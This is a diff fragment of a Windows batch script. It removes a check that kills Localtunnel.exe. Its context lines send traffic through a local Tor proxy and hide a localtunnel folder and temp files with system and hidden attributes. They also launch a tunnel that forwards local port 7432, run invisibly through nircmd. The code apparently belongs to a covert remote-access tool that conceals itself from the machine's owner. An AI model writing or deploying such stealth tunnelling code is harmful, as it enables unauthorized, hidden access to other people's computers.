@@ -23,12 +23,6 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
   set "proxy=--tlsv1"
 )
 
-if exist "%temp%\localtunnel.txt" (
-   echo.
-) else (
-   taskkill /f /im Localtunnel.exe
-)
-
 attrib -s -h -i "%environment%\localtunnel"
 tasklist /fi "imagename eq localtunnel.exe" | find /i "localtunnel.exe" > nul
 if not errorlevel 1 (attrib +s +h +i "%environment%\localtunnel") else (del /s /f /q /a "%temp%\localtunnel.bat" && del /s /f /q /a "%temp%\localtunnel.txt" && echo ^%environment%\localtunnel\localtunnel.exe --no-dashboard -h 127.0.0.1 -p 7432 --passthrough http^ ^>^ ^%temp%\localtunnel.txt^ > "%temp%\localtunnel.bat" && "%environment%\nircmd.exe" exec hide "%temp%\localtunnel.bat" && timeout -t 5 && attrib +s +h +i "%environment%\localtunnel" && attrib +s +h +i "%temp%\localtunnel.txt" && attrib +s +h +i "%temp%\localtunnel.bat" && timeout -t 10
